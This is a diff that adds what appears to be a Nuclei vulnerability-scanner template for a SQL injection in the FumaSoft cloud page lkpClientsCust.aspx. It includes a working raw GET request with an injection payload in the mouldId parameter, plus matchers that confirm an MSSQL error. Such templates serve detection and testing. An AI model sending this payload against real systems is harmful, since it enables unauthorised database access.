@@ -1,0 +1,30 @@
+id: fumasoft-lkpClientsCust-sqli
+info:
+  name: 孚盟云 lkpClientsCust.aspx SQL注入漏洞(VEID-2026-11107)
+  author: leadlife
+  severity: high
+  description: 孚盟云 lkpClientsCust.aspx SQL注入漏洞,攻击者可进行sql注入攻击获取数据库信息或者权限。
+  reference: 
+    - https://mp.weixin.qq.com/s/4BHmA8GIVQqRzyVWRy8q-Q
+  classification:
+    cve-id: 
+  metadata:
+    verified: true/false
+    fofa-query: demo
+    tips:
+    repair:
+    version:
+  tags: fumasoft,sqli
+
+http:
+  - raw:
+      - |
+        GET /PagePopWindow/lkpClientsCust.aspx?datastyletype=&searchfields=&FilterSQL=&mouldId=1'+OR+1=@@VERSION-- HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 500
+          - contains_all(body,'Microsoft SQL')
+        condition: and
